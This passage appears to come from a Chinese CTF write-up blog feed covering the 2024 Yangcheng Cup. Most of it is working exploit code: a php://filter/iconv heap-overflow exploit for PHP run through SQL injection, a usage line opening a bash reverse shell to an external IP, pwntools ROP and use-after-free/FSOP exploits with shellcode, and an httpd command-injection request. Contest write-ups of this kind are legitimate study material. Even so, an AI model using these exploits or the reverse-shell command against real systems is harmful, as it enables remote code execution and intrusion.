step4_use_custom_heap = qpe(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)<br>        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)<br><br>        pages = (<br>            step4 * <span class="hljs-number">3</span><br>            + step4_pwn<br>            + step4_custom_heap<br>            + step4_use_custom_heap<br>            + step3_overflow<br>            + pad * <span class="hljs-variable language_">self</span>.pad<br>            + step1 * <span class="hljs-number">3</span><br>            + step2_write_ptr<br>            + step2 * <span class="hljs-number">2</span><br>        )<br><br>        resource = compress(compress(pages))<br>        resource = b64(resource)<br>        resource = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;resource.decode()&#125;</span>&quot;</span><br><br>        filters = [<br>            <span class="hljs-comment"># Create buckets</span><br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <span class="hljs-string">&quot;zlib.inflate&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 0: Setup heap</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 1: Reverse FL order</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 2: Put fake pointer and make FL order back to normal</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 3: Trigger overflow</span><br>            <span class="hljs-string">&quot;dechunk&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,<br>            <br>            <span class="hljs-comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span><br>            <span class="hljs-string">&quot;convert.quoted-printable-decode&quot;</span>,<br>            <span class="hljs-string">&quot;convert.iconv.latin1.latin1&quot;</span>,<br>        ]<br>        filters = <span class="hljs-string">&quot;|&quot;</span>.join(filters)<br>        path = <span class="hljs-string">f&quot;php://filter/read=<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;resource&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">return</span> path<br><br><span class="hljs-meta">    @inform(<span class="hljs-params"><span class="hljs-string">&quot;Triggering...&quot;</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        path = <span class="hljs-variable language_">self</span>.build_exploit_path()<br>        start = time.time()<br>        path = <span class="hljs-string">f&quot;http://localhsot/&#x27; union select &#x27;<span class="hljs-subst">&#123;path&#125;</span>&#x27;#&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.remote.send(path)<br>        <span class="hljs-keyword">except</span> (ConnectionError, ChunkedEncodingError):<br>            <span class="hljs-keyword">pass</span><br>        <br>        msg_print()<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.sleep:<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)<br>        <span class="hljs-keyword">elif</span> start + <span class="hljs-variable language_">self</span>.sleep &lt;= time.time():<br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span><br>            msg_print(<span class="hljs-string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)<br>        <br>        msg_print()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress</span>(<span class="hljs-params">data</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># Remove 2-byte header and 4-byte checksum</span><br>    <span class="hljs-keyword">return</span> zlib.compress(data, <span class="hljs-number">9</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, misalign=<span class="hljs-literal">True</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    payload = base64.encode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> misalign <span class="hljs-keyword">and</span> payload.endswith(<span class="hljs-string">&quot;=&quot;</span>):<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Misaligned: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload.encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compressed_bucket</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> chunked_chunk(data, <span class="hljs-number">0x8000</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qpe</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">f&quot;=<span class="hljs-subst">&#123;x:02x&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data).upper().encode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ptr_bucket</span>(<span class="hljs-params">*ptrs, size=<span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ptrs) * <span class="hljs-number">8</span> == size<br>    bucket = <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(p64, ptrs))<br>    bucket = qpe(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = chunked_chunk(bucket)<br>    bucket = compressed_bucket(bucket)<br><br>    <span class="hljs-keyword">return</span> bucket<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">chunked_chunk</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, size: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span><br><span class="hljs-string">    chunked representation has size `size`.</span><br><span class="hljs-string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span><br>    <span class="hljs-comment"># enough</span><br>    <span class="hljs-keyword">if</span> size <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        size = <span class="hljs-built_in">len</span>(data) + <span class="hljs-number">8</span><br>    keep = <span class="hljs-built_in">len</span>(data) + <span class="hljs-built_in">len</span>(<span class="hljs-string">b&quot;\n\n&quot;</span>)<br>    size = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> size.encode() + <span class="hljs-string">b&quot;\n&quot;</span> + data + <span class="hljs-string">b&quot;\n&quot;</span><br><br><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Region</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span><br><br>    start: <span class="hljs-built_in">int</span><br>    stop: <span class="hljs-built_in">int</span><br>    permissions: <span class="hljs-built_in">str</span><br>    path: <span class="hljs-built_in">str</span><br><br><span class="hljs-meta">    @property</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.stop - <span class="hljs-variable language_">self</span>.start<br><br><br>Exploit()<br><br></code></pre></td></tr></table></figure><p>用法与原来一样</p><p><code>python3 exp.py http://x.x.x.x:10034/url.php &#39;bash -c &quot;bash -i&gt;&amp;/dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;&#39;</code></p><p><img src="/img/wp/2024/2024-ycb-c-%E7%BD%91%E7%BB%9C%E7%85%A7%E7%9B%B8%E9%A6%86-1.png"></p><h1 id="初赛-pwn"><a href="#初赛-pwn" class="headerlink" title="[初赛] pwn"></a>[初赛] pwn</h1><h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>pop_rdi=<span class="hljs-number">0x0000000000400773</span><br>leave=<span class="hljs-number">0x4006DB</span><br>ret=<span class="hljs-number">0x4006DC</span><br>read=<span class="hljs-number">0x4006C4</span><br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#gdb.attach(p,f&#x27;bp &#123;leave&#125;&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;139.155.126.78&quot;</span>,<span class="hljs-string">&quot;39592&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc&quot;)</span><br>fun_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>bss=e.bss(<span class="hljs-number">0x800</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendafter(<span class="hljs-string">&quot;rflow?\n&quot;</span>,payload)<br>p.send(p64(bss+<span class="hljs-number">0x50</span>)+p64(pop_rdi)+p64(fun_got)+p64(puts)+p64(read)+p64(<span class="hljs-number">0</span>)+p64(bss-<span class="hljs-number">0x30</span>)+p64(leave))<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>payload=p64(bss)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(read)+p64(bss+<span class="hljs-number">0x50</span>-<span class="hljs-number">0x30</span>)+p64(leave)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h2><p>uaf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>city=[<span class="hljs-string">b&quot;guangzhou&quot;</span>,<span class="hljs-string">b&quot;nanning&quot;</span>,<span class="hljs-string">b&quot;changsha&quot;</span>,<span class="hljs-string">b&quot;nanchang&quot;</span>,<span class="hljs-string">b&quot;fuzhou&quot;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">tool,form,to,data=<span class="hljs-string">b&#x27;\n&#x27;</span>,far=<span class="hljs-number">999</span></span>):<br>    tools=[<span class="hljs-string">b&#x27;car&#x27;</span>,<span class="hljs-string">b&#x27;train&#x27;</span>,<span class="hljs-string">b&#x27;plane&#x27;</span>]<br><br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;plane?&#x27;</span>,tools[tool])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;far?&#x27;</span>,<span class="hljs-built_in">str</span>(far).encode());<br>    p.sendafter(<span class="hljs-string">b&#x27;Note:&#x27;</span>,data)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">form,to</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">form,to</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">form,to,ind,data,far=<span class="hljs-number">3000</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[form])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;where?&#x27;</span>,city[to])<br>    p.sendlineafter(<span class="hljs-string">b&#x27;change?&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;far?&#x27;</span>,<span class="hljs-built_in">str</span>(far).encode());<br>    p.sendafter(<span class="hljs-string">b&#x27;Note:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">distan</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;distance.&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;travel&#x27;</span>,city[<span class="hljs-number">3</span>])<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;139.155.126.78&quot;</span>,<span class="hljs-string">&quot;39558&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;b _IO_obstack_xsputn\nc&#x27;)</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,far=<span class="hljs-number">999</span>,data=<span class="hljs-string">b&quot;1324&quot;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,far=<span class="hljs-number">999</span>,data=<span class="hljs-string">b&quot;321&quot;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,far=<span class="hljs-number">999</span>,data=<span class="hljs-string">b&quot;132&quot;</span>) <span class="hljs-comment">#2</span><br>distan()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)  <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,<span class="hljs-string">b&quot;adsf&quot;</span>) <span class="hljs-comment">#6</span><br><span class="hljs-comment">#pause()</span><br>free(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#free(0,0)</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#4+0x10</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">#5+0x20</span><br>free(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Note:&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ace0</span><br>success(<span class="hljs-string">f&quot;libc.address: 0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br>IO_list_all=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>xxx=libc.address+<span class="hljs-number">0x21b660</span><br>success(<span class="hljs-string">f&quot;IO_list_all: 0x<span class="hljs-subst">&#123;IO_list_all:x&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Note:&#x27;</span>)<br>chunk_1=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;chunk_1: 0x<span class="hljs-subst">&#123;chunk_1:x&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Note:&#x27;</span>)<br>large_bin=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">f&quot;large bin: 0x<span class="hljs-subst">&#123;large_bin:x&#125;</span>&quot;</span>)<br>pause()<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p64(large_bin)*<span class="hljs-number">2</span>+p64(IO_list_all-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>,far=<span class="hljs-number">0x531</span>)<br>pause()<br><br>chunk_0=chunk_1-<span class="hljs-number">0x520</span><br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk_1,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk_1,<span class="hljs-number">0x300</span>)<br>fake_io_add=chunk_0<br><br>obstack=fake_io_add<br>context=fake_io_add+<span class="hljs-number">0xe8</span><br>shelladd=context+<span class="hljs-number">0xe8</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x20</span>: [xxx,xxx,xxx],<br>    <span class="hljs-number">0x60</span>: [<span class="hljs-number">0</span>,shelladd,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,setcontext,<span class="hljs-number">0</span>,context,<span class="hljs-number">1</span>],<br><br>    <span class="hljs-number">0xd8</span>: obstack_jump+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0xe0</span>: fake_io_add+<span class="hljs-number">0x60</span>,<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>cont=flat(&#123;<br>    <span class="hljs-number">0x68</span>: obstack&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br>    <span class="hljs-number">0xa0</span>: fake_io_add+<span class="hljs-number">0x68</span>, <span class="hljs-comment"># rsp</span><br>    <span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment"># rcx-&gt;rip</span><br>    <span class="hljs-number">0xe0</span>: obstack<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload=fake_io[<span class="hljs-number">0x20</span>:]+cont+asm(shellcode)<br><br>free(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,data=payload.ljust(<span class="hljs-number">0x400</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>free(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br><br><span class="hljs-comment">#free(4,2)</span><br><span class="hljs-comment">#add(1,4,3,data=payload)</span><br><br>p.sendline(<span class="hljs-string">&#x27;9&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">// 第一次 直接执行命令，将flag导入到/check/test.html中</span><br>GET /cat%20/flag%20%3e%63%68%65%63%6b%2f%74%65%73%74%2e%68%74%6d%6c HTTP/<span class="hljs-number">1.0</span><br>Host: <span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span><br>Content-Length: <span class="hljs-number">7</span><br><br><span class="hljs-number">123</span><br><br><br><br><br><span class="hljs-comment">//第二次</span><br>GET /check/test.html HTTP/<span class="hljs-number">1.0</span><br>Host: <span class="hljs-number">139.155</span><span class="hljs-number">.126</span><span class="hljs-number">.78</span><br>Content-Length: <span class="hljs-number">7</span><br><br><span class="hljs-number">123</span><br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="决赛-渗透测试"><a href="#决赛-渗透测试" class="headerlink" title="[决赛] 渗透测试"></a>[决赛] 渗透测试</h1><p><img src="/img/wp/2024/2024-ycb-j-shentou-1.png" alt="拓扑"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初赛-数据安全&quot;&gt;&lt;a href=&quot;#初赛-数据安全&quot; class=&quot;headerlink&quot; title=&quot;[初赛] 数据安全&quot;&gt;&lt;/a&gt;[初赛] 数据安全&lt;/h1&gt;&lt;h2 id=&quot;data-analy1&quot;&gt;&lt;a href=&quot;#data-analy1&quot; class</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="羊城杯" scheme="https://www.dr0n.top/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>php-fpm攻击总结</title>
    <link href="https://www.dr0n.top/posts/21a69435/"/>
    <id>https://www.dr0n.top/posts/21a69435/</id>
    <published>2024-07-22T04:00:00.000Z</published>
    <updated>2025-07-27T09:32:26.441Z</updated>
    
